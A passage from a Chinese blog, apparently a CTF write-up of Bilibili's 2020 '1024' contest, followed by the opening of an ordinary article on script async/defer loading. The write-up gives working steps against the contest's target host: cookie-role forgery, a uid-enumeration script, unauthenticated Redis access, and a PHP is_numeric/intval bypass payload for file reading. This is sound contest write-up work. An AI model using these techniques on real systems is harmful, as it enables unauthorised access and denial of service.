<span class=\"hljs-comment\">//console.log(data);</span>        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            $(<span class=\"hljs-string\">'#flag2'</span>).html(<span class=\"hljs-string\">\"flag2: \"</span> + data.data);        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag2'</span>).html(<span class=\"hljs-string\">\"需要使用bilibili Security Browser浏览器访问～\"</span>);        }    }})</code></pre>\n<p>第二题要求用「bilibili Security Browser」访问，有没有让你想起来前年 USTC Hackergame 2018 的「黑曜石浏览器」？</p>\n<p>直接用 <code>bilibili Security Browser</code> 作为 User-Agent 请求 API 即可获得 Flag，注意别忘了带上 <code>Session</code> 这个 Cookie，这个是 Bilibili 账户登录状态。</p>\n<blockquote>\n<p>Chromium Based 浏览器本身内置了修改了 User-Agent 的功能。打开 DevTools 的设置菜单、在「Devices」里添加一个新的设备，此处可以指定 User-Agent：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/2.png\" width=\"830\" height=\"301\" class=\"lazy post-img\"></p>\n<p>之后就可以使用「bilibili Security Browser」访问了：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/3.png\" width=\"751\" height=\"666\" class=\"lazy post-img\"></p>\n</blockquote>\n<h2>密码是啥？</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/4.png\" width=\"1905\" height=\"853\" class=\"lazy post-img\"></p>\n<p>这道题没啥好 Write Up 的，全部靠猜。用户名是 <code>admin</code> 密码是 <code>bilibili</code>。</p>\n<blockquote><p>你这算哪门子 CTF 啊？又不靠社工，真就硬猜？</p></blockquote>\n<p>以及，你给我翻译翻译，什么叫做 falg？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/5.png\" width=\"431\" height=\"731\" class=\"lazy post-img\"></p>\n<h2>对不起，权限不足～</h2>\n<p>首次访问：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/6.png\" width=\"1899\" height=\"543\" class=\"lazy post-img\"></p>\n<p>刷新一次：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/7.png\" width=\"1901\" height=\"538\" class=\"lazy post-img\"></p>\n<p>有趣，看一下源代码：</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/4\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-built_in\">console</span>.log(data);        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"欢迎超级管理员登陆～答案是 : {{ \"</span> + data.data + <span class=\"hljs-string\">\" }}\"</span>.toLowerCase() )        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"有些秘密只有超级管理员才能看见哦~\"</span>)        }    }})</code></pre>\n<p>又是 API 返回 flag，用手指头想都知道鉴权是 Cookie 做的，打开 F12 查看 Cookie：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/8.png\" width=\"646\" height=\"46\" class=\"lazy post-img\"></p>\n<p>两个 Cookie，一个是 <code>session</code>，是 Bilibili 账户登录状态的 cookie；另一个是 <code>role</code>，毫无疑问就是我们下手的对象：</p>\n<pre><code class=\"hljs plaintext\">role=ee11cbb19052e40b07aac0ca060c23ee</code></pre>\n<p>打 CTF 的人应该早就把这一串刻进 DNA 里了。即使不知道这串字符是什么东西，丢进搜索引擎后也会知道这是 <code>user</code> 的 MD5。接下来思路就很清晰了，通过将 <code>role</code> 的 Cookie 改成另一串 MD5 即可。</p>\n<p>不过这就是这道题离谱的地方了，这道题要把 <code>role</code> 改成 <code>Administrator</code> 的 MD5（你没有看错，首字母是大写的）：</p>\n<pre><code class=\"hljs plaintext\">role=7b7bc2512ee1fedcd76bdc68926d4f7b</code></pre>\n<p>改好 Cookie 刷新页面就可以拿到 flag 了。</p>\n<h2>别人的秘密</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/9.png\" width=\"1897\" height=\"512\" class=\"lazy post-img\"></p>\n<pre><code class=\"hljs js\">$(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) </span>{    (<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">$</span>) </span>{        $.getUrlParam = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">name</span>) </span>{            <span class=\"hljs-keyword\">var</span> reg = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">RegExp</span>(<span class=\"hljs-string\">\"(^|&amp;)\"</span> + name + <span class=\"hljs-string\">\"=([^&amp;]*)(&amp;|$)\"</span>);            <span class=\"hljs-keyword\">var</span> r = <span class=\"hljs-built_in\">window</span>.location.search.substr(<span class=\"hljs-number\">1</span>).match(reg);            <span class=\"hljs-keyword\">if</span> (r != <span class=\"hljs-literal\">null</span>) <span class=\"hljs-keyword\">return</span> <span class=\"hljs-built_in\">unescape</span>(r[<span class=\"hljs-number\">2</span>]); <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">null</span>;        }    })(jQuery);    <span class=\"hljs-keyword\">var</span> uid = $.getUrlParam(<span class=\"hljs-string\">'uid'</span>);    <span class=\"hljs-keyword\">if</span> (uid == <span class=\"hljs-literal\">null</span>) {        uid = <span class=\"hljs-number\">100336889</span>;    }    $.ajax({        <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/5?uid=\"</span> + uid,        <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,        <span class=\"hljs-attr\">success</span>: <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{            <span class=\"hljs-built_in\">console</span>.log(data);            <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>) {                <span class=\"hljs-comment\">// 如果有值：前端跳转</span>                $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"欢迎超级管理员登陆～flag : \"</span> + data.data)            } <span class=\"hljs-keyword\">else</span> {                <span class=\"hljs-comment\">// 如果没值</span>                $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"这里没有你想要的答案～\"</span>)            }        }    })});</code></pre>\n<p>这道题更离谱，上来先在 jQuery 的 <code>$</code> 对象下挂了一个 <code>getUrlParam</code> 方法用来获取 uid、然后还有一个当 uid 不存在时给予默认值的方法（默认值取 <code>100336889</code>），接下来就是 <code>GET /api/ctf/5?uid=${uid}</code>。</p>\n<blockquote><p>千万不要学习本题源码中的方法解析 URL 参数！<code>unescape</code> 不能处理非 ASCII 字符，极易产生乱码，在生产环境中只应使用 WHATWG URL API 的 <code>searchParams</code> ！</p></blockquote>\n<p>这道题没什么好说的，直接遍历就好了，Node.js 解法如下：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> http = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'http'</span>);<span class=\"hljs-keyword\">async</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">get</span>(<span class=\"hljs-params\">hostname, path</span>) </span>{  <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Promise</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">resolve, reject</span>) =&gt;</span> {    <span class=\"hljs-keyword\">const</span> req = http.request(      { hostname, path, <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'GET'</span> },      <span class=\"hljs-function\">(<span class=\"hljs-params\">res</span>) =&gt;</span> {        <span class=\"hljs-keyword\">const</span> body = [];        res.on(<span class=\"hljs-string\">'data'</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">chunk</span>) =&gt;</span> { body.push(chunk); });        res.on(<span class=\"hljs-string\">'end'</span>, <span class=\"hljs-function\">() =&gt;</span> {          <span class=\"hljs-keyword\">try</span> {            resolve(Buffer.concat(body).toString());          } <span class=\"hljs-keyword\">catch</span> (e) {            reject(e);          }        });        req.on(<span class=\"hljs-string\">'error'</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">err</span>) =&gt;</span> { reject(err); });      }    );    req.setHeader(<span class=\"hljs-string\">'Cookie'</span>, <span class=\"hljs-string\">'session=你的 Session'</span>)    req.end();  });}(<span class=\"hljs-keyword\">async</span> () =&gt; {  <span class=\"hljs-keyword\">const</span> ip = <span class=\"hljs-string\">'45.113.201.36'</span>; <span class=\"hljs-comment\">// 我也不知道靶机的 IP 为什么会变，可能被打死了</span>  <span class=\"hljs-keyword\">let</span> uid = <span class=\"hljs-number\">100336889</span>;  <span class=\"hljs-keyword\">while</span> (<span class=\"hljs-literal\">true</span>) {    <span class=\"hljs-keyword\">const</span> res = <span class=\"hljs-keyword\">await</span> get(ip, <span class=\"hljs-string\">`/api/ctf/5?uid=<span class=\"hljs-subst\">${uid++}</span>`</span>);    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-built_in\">JSON</span>.parse(res).code === <span class=\"hljs-number\">200</span>) {      <span class=\"hljs-built_in\">console</span>.log(uid, res);      <span class=\"hljs-keyword\">break</span>;    }  }})();</code></pre>\n<p>唯一值得说的是，如果从他给的 UID 默认值（<code>100336889</code>）开始往上刷，很快就刷到了（<code>100336952</code>）。</p>\n<blockquote><p>这我们怎么知道嘛？我反正一开始是从 0 开始刷的，好在我做这道题时是 10 月 24 日凌晨三点、只有几个人在玩，靶机还扛得住，1 亿我真就刷出来了。</p></blockquote>\n<h2>结束亦是开始</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/10.png\" width=\"1443\" height=\"870\" class=\"lazy post-img\"></p>\n<p>一个页面，文章标题、内容、分类、标签全部都是 null；评论框是用 HTML5 表单做的、什么都不能提交；URL 的格式是 <code>/blog/single.php?id=1</code>。</p>\n<p>这道题和 CUIT（成都信息科技大学）有一年 CTF 校内赛的渗透题很类似。那道题也是 <code>single.php?id=1</code>，SQL 提权然后 Get shell 打入内网。所以一开始看到这个 URL 就开始盲猜是 SQL 注入。我当时做到这道题时已经五点了，所以挂上 sqlmap 就去睡觉了，结果并没有做出来这道题（sqlmap 毫无头猪，不过给了疑似存在 Referer 时间戳盲注）。</p>\n<blockquote><p>等做出来第十题后再来看这道题，就觉得非常离谱；到后来做出来的大佬提示大家这是一道脑洞题时，我已经没有心思做下去了。</p></blockquote>\n<p>从第六题开始，所有题目都说「接下来的旅程，需要少年自己去探索啦～」，也就是说接下来所有的题目都是 Web 盲题。</p>\n<h2>第八题</h2>\n<p>这道题要靠 nmap 扫端口扫出来，发现 6379 端口开放，当然就是大家最爱的未设防的 Redis 服务器啦。</p>\n<p>直接通过 redis-cli 连接靶机，一把梭拿到 flag：</p>\n<pre><code class=\"hljs plaintext\">$ redis-cli -h [靶机 IP] -p 637945.113.201.36:6379&gt; keysflag845.113.201.36:6379&gt; get flag8</code></pre>\n<p>值得注意的是，这 Redis Server 很有趣，因为你使用任何其它命令都只会返回 OK：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/11.png\" width=\"406\" height=\"168\" class=\"lazy post-img\"></p>\n<p>所以，这个很可能是个假的 Redis Server、就是个 REPL，<del>也许第九题就是道 pwn 题呢？</del></p>\n<h2>第十题</h2>\n<p>第十题的入口要靠目录爆破，我使用的工具是 <a href=\"https://github.com/maurosoria/dirsearch\">dirsearch</a>：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/12.png\" width=\"833\" height=\"573\" class=\"lazy post-img\"></p>\n<p>直接访问 <code>/test.php</code> 是个 JSFuck，所以直接丢进 Console 就好了：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/13.png\" width=\"689\" height=\"145\" class=\"lazy post-img\"></p>\n<blockquote><p>程序员最多的地方 bilibili1024havefun</p></blockquote>\n<p>程序员最多的地方当然是 GitHub 了。去 GitHub 上搜索 <code>bilibili1024havefun</code> 很容易就可以找到这个仓库 <a href=\"https://github.com/interesting-1024/end\">interesting-1024/end</a>：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><span class=\"hljs-comment\">//filename end.php</span><span class=\"hljs-variable\">$bilibili</span> = <span class=\"hljs-string\">\"bilibili1024havefun\"</span>;<span class=\"hljs-variable\">$str</span> = intval(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]);<span class=\"hljs-variable\">$reg</span> = preg_match(<span class=\"hljs-string\">'/\\d/is'</span>, <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]);<span class=\"hljs-keyword\">if</span>(!is_numeric(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]) <span class=\"hljs-keyword\">and</span> <span class=\"hljs-variable\">$reg</span> !== <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-variable\">$str</span> === <span class=\"hljs-number\">1</span>){    <span class=\"hljs-variable\">$content</span> = file_get_contents(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'url'</span>]);    <span class=\"hljs-comment\">//文件路径猜解</span>    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-literal\">false</span>){        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"还差一点点啦～\"</span>;    }<span class=\"hljs-keyword\">else</span>{        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-variable\">$flag</span>;    }}<span class=\"hljs-keyword\">else</span>{    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"你想要的不在这儿～\"</span>;}<span class=\"hljs-meta\">?&gt;</span></code></pre>\n<p>所以这道题就是在 <code>/blog/end.php</code> 里了，构建 Payload 以获取 Flag。这道题考察的是 <code>is_numeric</code> 和 <code>intval</code> 如何绕过、以及 <code>$_GET</code> 的一些脑洞。这道题最终的 Payload 是：</p>\n<pre><code class=\"hljs plaintext\">/blog/end.php?id[]=x&amp;id[]=0.1&amp;url=./flag.txt</code></pre>\n<blockquote><p><code>url</code> 参数只要包含 <code>flag.txt</code> 即可，所以你就算 <code>url=114514flag.txt1919810</code> 都是可以的。和某些人说的 <code>/api/ctf/10/flag.txt</code>、<code>/api/ctf/6/flag.txt</code> 完全没有关系。</p></blockquote>\n<p>这道题最简洁的思路是利用 <code>$_GET</code> 支持返回数组 ：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span>print_r(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'tag_name'</span>]);<span class=\"hljs-comment\">// http://127.0.0.1/index.php?tag_name[]=苏卡卡&amp;tag_name[]=大尾巴狐狸</span><span class=\"hljs-comment\">// Array ( [0] =&gt; 苏卡卡 [1] =&gt; 大尾巴狐狸 )</span></code></pre>\n<p>关于如何 Bypass <code>is_numeric</code>、<code>intval</code>，我找到了一篇写的还挺全面的文章「<a href=\"https://hackfun.org/2018/01/09/CTF%E4%B8%AD%E5%B8%B8%E8%A7%81PHP%E7%89%B9%E6%80%A7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/\">CTF 中常见 PHP 特性学习笔记</a>」。</p>\n<blockquote><p>顺便，不少战队和选手通过 <code>$file_get_contents</code> 逃逸后，把每道题的源码都读了一遍、甚至通过读取 <code>/dev/urandom</code> 和 <code>/dev/random</code> 拖死了靶机，不过这已经是后话了。</p></blockquote>\n<h2>尾声</h2>\n<p>USTC Hackergame 2018 为了「黑曜石浏览器」的题专门上线了一个官网、在那个官网的源码中隐藏了 Heicore Browser 的 User-Agent，Bilibili 的第二题是一个非常拙劣的模仿；第三题直接就是脑筋急转弯，和渗透、社工毫无关联，密码纯粹靠猜；第四题更是表现了出题人的前端知识基本为 0，使用从 CSDN 上抄来的 URL 参数解析代码，却不知道 JavaScript 中 <code>unescape</code> 不能处理非 ASCII 字符（更不必说 <code>unescape</code> 是一个已被弃用的方法），基本上是个前端都知道宁肯引入 <code>URL.searchParams</code> 的 Polyfill 也不应该自己解析 URL；第五题并没有明确提示告诉大家应该从给定的默认 uid 开始刷（你给我翻译翻译，谁家系统的超级管理员 uid 不是小于 10 而是大于 1 亿的？）。在经过了这么多无厘头的题目以后，接下来上来就是五道 Web 盲题：未设防 Redis 题本来可以深入到 Get shell、提权的，结果第八题草草 <code>get flag8</code> 了事；第十题的「文件路径猜解」更是非常无厘头，当做题人构建完能绕过 <code>is_numeric</code> 和 <code>intval</code>  的 Payload 后，还要猜测 <code>url</code> 参数的取值需要包含 <code>flag.txt</code> 才能取到最终的 flag；而且第十题拿到的图片直接 <code>tail</code> 就能拿到 flag，而图片隐写本来是非常经典的 CTF 考法。</p>\n<p>无厘头的题目、加上混乱的活动页面（Vue 和 jQuery 齐飞、Element UI 共 Bootstrap 一色），再联想起 Bilibili 中间件源码泄漏、Anankke 在新年活动上 <a href=\"https://blog.anank.ke/w/pilipili_cheers\">只用两小时就刷出了 11 亿美食值</a>，我们大体上可以猜测的出 Bilibili 内部混乱的管理、松散的组织，和极度不重视信息安全、乃至极度不重视技术的风气。Bilibili 这一次的 CTF 暴露出来的问题，远不止选手用 <code>/blog/end.php</code> 读取 <code>/dev/urandom</code> 和 <code>/dev/random</code> 耗尽靶机性能导致题目 404 这么简单了。</p>\n<div class=\"license\"> <div class=\"license-title\">Bilibili 2020「1024 程序员节」CTF Write Up</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/\">https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-10-25</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/"},{"title":"从 Google Analytics 的统计代码说起 —— 谈谈 script 标签的 async 和 defer 属性","date":"2020-10-13 09:25:00","description":"\n<p>之前我在「<a href=\"https://blog.skk.moe/post/how-to-make-a-fast-blog/\">天下武功，唯快不破 —— 我是这样优化博客的</a>」一文中提到「对于大部分浏览器来说，确保 JS 异步加载和执行的做法其实是在操作 DOM 动态插入 <code>&lt;script async&gt;</code>」，但是并没有给出详细原因。这一次我以 Google Analytics 的统计代码为引子，详细讲讲 <code>&lt;script&gt;</code> 的 <code>async</code> 和 <code>defer</code> 属性、以及它们背后的故事。</p>\n<h2>拆开 Google Analytic 的统计代码</h2>\n<p>现在 Google 推出了 Google Tag Manager，通过 <code>window.gtag</code> 可以轻易加载包括 <code>analytics.js</code>、Google AD、Google OAuth 等 Google 插件：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Global site tag (gtag.js) - Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">async</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">\"https://www.googletagmanager.com/gtag/js?id=UA-122669675-1\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">  <span class=\"hljs-built_in\">window</span>.dataLayer = <span class=\"hljs-built_in\">window</span>.dataLayer || [];</span><span class=\"javascript\">  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">gtag</span>(<span class=\"hljs-params\"></span>)</span>{dataLayer.push(<span class=\"hljs-built_in\">arguments</span>);}</span><span class=\"javascript\">  gtag(<span class=\"hljs-string\">'js'</span>, <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>());</span><span class=\"javascript\"></span><span class=\"javascript\">  gtag(<span class=\"hljs-string\">'config'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></code></pre>\n<p>在 Google Tag Manager 出现之前，大部分人更熟悉传统的 <code>analytics.js</code> 统计代码：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">i,s,o,g,r,a,m</span>)</span>{i[<span class=\"hljs-string\">'GoogleAnalyticsObject'</span>]=r;i[r]=i[r]||<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)</span>{</span><span class=\"javascript\">(i[r].q=i[r].q||[]).push(<span class=\"hljs-built_in\">arguments</span>)},i[r].l=<span class=\"hljs-number\">1</span>*<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>();a=s.createElement(o),</span><span class=\"javascript\">m=s.getElementsByTagName(o)[<span class=\"hljs-number\">0</span>];a.async=<span class=\"hljs-number\">1</span>;a.src=g;m.parentNode.insertBefore(a,m)</span><span class=\"javascript\">})(<span class=\"hljs-built_in\">window</span>,<span class=\"hljs-built_in\">document</span>,<span class=\"hljs-string\">'script'</span>,<span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>,<span class=\"hljs-string\">'ga'</span>);</span><span class=\"javascript\"></span><span class=\"javascript\">ga(<span class=\"hljs-string\">'create'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>, <span class=\"hljs-string\">'auto'</span>);</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'send'</span>, <span class=\"hljs-string\">'pageview'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-comment\">&lt;!-- End Google Analytics --&gt;</span></code></pre>\n<p>Google 提供的代码是经过压缩后的版本。不过这段代码很短，完全不使用 debugger 等方法也可以还原出原始的代码，让我们拆拆看吧。</p>\n<p>首先不难看出这是一个 IIFE 函数，变量 <code>i</code>、<code>s</code>、<code>o</code>、<code>g</code> 和 <code>r</code>分别指的是 <code>window</code>、<code>document</code>、<code>'script'</code>、<code>https://www.google-analytics.com/analytics.js</code> 和 <code>'ga'</code>（变量 <code>a</code> 和 <code>m</code> 尚未被赋值）。让我们替换这些变量、把 IIFE 拆开：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'GoogleAnalyticsObject'</span>] = <span class=\"hljs-string\">'ga'</span>;<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>] = <span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>] || <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) </span>{  <span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].q = (<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].q || []).push(<span class=\"hljs-built_in\">arguments</span>)};<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].l = +<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>();<span class=\"hljs-keyword\">var</span> a = <span class=\"hljs-built_in\">document</span>.createElement(<span class=\"hljs-string\">'script'</span>);a.async = <span class=\"hljs-number\">1</span>;a.src = <span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>;<span class=\"hljs-keyword\">var</span> m = <span class=\"hljs-built_in\">document</span>.getElementsByTagName(<span class=\"hljs-string\">'script'</span>)[<span class=\"hljs-number\">0</span>];m.parentNode.insertBefore(a, m);</code></pre>\n<p>这下就清楚多了。抛开 Google Analytics 的队列初始化、函数初始化的操作，<code>analytics.js</code> 本质上是通过 JS 动态创建一个 <code>&lt;script async&gt;</code> 标签、并插入到 DOM 中所有 <code>&lt;script&gt;</code> 标签之前。</p>\n<p><a href=\"https://developers.google.com/analytics/devguides/collection/analyticsjs/\">Google 关于 <code>analytics.js</code> 的文档</a> 是这么介绍的：</p>\n<blockquote>\n<p>While the Google Analytics tag described above ensures the script will be loaded and executed asynchronously on all browsers, it has the disadvantage of not allowing modern browsers to preload the script.</p>\n<p>虽然上述代码保证了脚本在所有浏览器上都会异步地加载和执行，但是它也有一个缺陷、它不能够让浏览器 preload 外部的脚本文件。</p>\n</blockquote>\n<p>Google 在文档中也给出了「现代浏览器」专用的代码，看起来和今天的 Google Tag Manager 载入代码非常接近：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\"><span class=\"hljs-built_in\">window</span>.ga=<span class=\"hljs-built_in\">window</span>.ga||<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)</span>{(ga.q=ga.q||[]).push(<span class=\"hljs-built_in\">arguments</span>)};ga.l=+<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>;</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'create'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>, <span class=\"hljs-string\">'auto'</span>);</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'send'</span>, <span class=\"hljs-string\">'pageview'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">async</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-comment\">&lt;!-- End Google Analytics --&gt;</span></code></pre>\n<p>Google 文档也对第二种代码进行了介绍：</p>\n<blockquote>\n<p>The alternative async tag below adds support for preloading, which will provide a small performance boost on modern browsers, but can degrade to synchronous loading and execution on IE 9 and older mobile browsers that do not recognize the <code>async</code> script attribute.</p>\n<p>第二种方法在现代浏览器上会略微提升性能，因为现代浏览器支持 preloading。但是在不认识 <code>async</code> 属性的 IE9 和一些老旧的移动端浏览器上，这种方法会降级为同步加载和执行。</p>\n</blockquote>\n<p>所以，结合上述代码和 Google 文档中的描述，我们不难得出结论：</p>\n<ul>\n<li>第一种做法（由 JS 生成 <code>&lt;script async&gt;</code> 标签、动态插入 DOM 中）可以确保 <code>analytics.js</code> 被异步加载和执行，但是在现代浏览器上由于不能提前发现 <code>analytics.js</code> 、不能 preload。</li>\n<li>第二种做法在 HTML 中直接声明了 <code>&lt;script async&gt;</code>、可以被现代浏览器在 Parse HTML 阶段发现 <code>analytics.js</code> 并 preload。但是对于「并不现代的」浏览器中，这种做法不能保证 <code>analytics.js</code> 被异步加载和执行。</li>\n</ul>\n<p>那么，为什么 Google 要这么说呢？</p>\n<h2>混乱的 defer 和 async 实现</h2>\n<p>绝大部分从事前端开发的程序员应该都非常了解 <code>defer</code> 和 <code>async</code> 以及他们的区别：</p>\n<ul>\n<li>\n<code>async</code> 的加载不会阻碍 DOM 的解析，但是当加载完后就会立即执行，执行时会阻碍 DOM 的解析</li>\n<li>\n<code>defer</code> 的加载也不会阻碍 DOM 的解析，并且会在 DOM 解析完后、<code>DOMContentLoaded</code> 触发之前执行</li>\n</ul>\n<p>鲜少有人知道的是，在 HTML5 之前，异步加载和执行外部脚本有一段混乱而荒唐的历史。</p>\n<p><code>defer</code> 属性的历史可以追溯到 1999 年 12 月 24 日制定的 HTML4.01 规范。在 <a href=\"https://www.w3.org/TR/html401/interact/scripts.html#adef-defer\">规范的第 18.2 节中的 18.2.1「SCRIPT 元素」</a> 中，有对 <code>defer</code> 属性的描述：</p>\n<blockquote>\n<p>When set, this boolean attribute provides a hint to the user agent that the script is not going to generate any document content (e.g., no “document.write” in javascript) and thus, the user agent can continue parsing and rendering.</p>\n<p>该 Boolean Attribute 用于提示 User Agent 这份脚本不会生成 document 内容（如，不使用 <code>document.write</code>），因此 User Agent 在遇到该脚本时不应该暂停解析和渲染 document。</p>\n</blockquote>\n<p>值得注意的是，在 HTML4.01 规范中没有强制浏览器用什么行为面对 <code>defer</code> 属性，各个浏览器的实现导致了千奇百怪的行为，这里仅简单列举几个 Quirk 行为：</p>\n<ul>\n<li>2001 年发布的 IE 6 开始对 <code>defer</code> 属性提供支持，但是直到 11 年后 IE 10 